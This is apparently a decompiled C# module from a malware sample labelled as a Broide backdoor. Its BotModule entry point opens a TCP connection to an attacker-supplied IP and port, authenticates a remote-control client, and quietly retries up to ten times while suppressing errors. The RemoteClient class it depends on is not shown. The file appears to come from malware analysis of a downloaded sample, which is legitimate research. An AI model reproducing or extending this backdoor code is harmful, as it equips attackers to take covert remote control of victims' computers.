// Decompiled with JetBrains decompiler
// Type: EntryNameSpace.BotModule
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace EntryNameSpace
{
  public static class BotModule
  {
    public static bool needReconnect = true;
    public static string[] _args;
    public static byte[] id = Encoding.ASCII.GetBytes(Path.GetRandomFileName() + Path.GetRandomFileName());

    public static void EntryPoint(string[] Param_37)
    {
      for (int index = 0; (index >= 10 ? 0 : (BotModule.needReconnect ? 1 : 0)) != 0; ++index)
      {
        try
        {
          BotModule._args = Param_37;
          Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          socket.Connect((EndPoint) new IPEndPoint(IPAddress.Parse(BotModule._args[1].Split(':')[0]), Convert.ToInt32(BotModule._args[1].Split(':')[1])));
          RemoteClient.Connection.RemoteClient_2 = new RemoteClient.RemoteClient(socket);
          RemoteClient.Connection.RemoteClient_2.Auth();
          while (RemoteClient.Connection.RemoteClient_2.clientState)
            Thread.Sleep(1000);
          Thread.Sleep(5000);
        }
        catch
        {
        }
      }
    }
  }
}
